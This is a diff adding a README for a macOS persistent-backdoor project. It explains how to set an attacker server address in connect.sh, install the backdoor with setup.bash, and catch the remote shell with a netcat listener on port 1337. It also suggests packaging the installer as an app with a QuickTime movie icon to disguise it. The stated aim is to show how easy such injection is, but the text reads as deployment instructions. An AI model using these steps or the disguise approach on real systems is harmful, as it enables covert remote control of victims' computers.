@@ -1,0 +1,19 @@
+# OSX-Peristant-BackDoor
+
+Here is a tutorial of this backdoor for OSX: http://patrickmosca.com/osx-persistent-backdoor/
+
+[![](http://patrickmosca.com/wp-content/uploads/2013/04/root.png)](http://patrickmosca.com/wp-content/uploads/2013/04/root.png)
+
+1. Edit `connect.sh` with your publically visible sever ip address and port.
+2. Run `setup.bash` on modern OS X to install the backdoor.
+3. Catch the shell remotely with `nc -l -p 1337`
+
+A sample Quicktime movie icon and Platypus file is also included. 
+These can be used to package the `setup.bash` script into an OS X app bundle.
+The purpose of this package is to show how easy it is to inject a backdoor into OSX.
+
+Platypus can be found here: http://sveinbjorn.org/platypus
+
+## License
+
+This code is distributed under the terms and conditions of the [MIT license](LICENSE). 
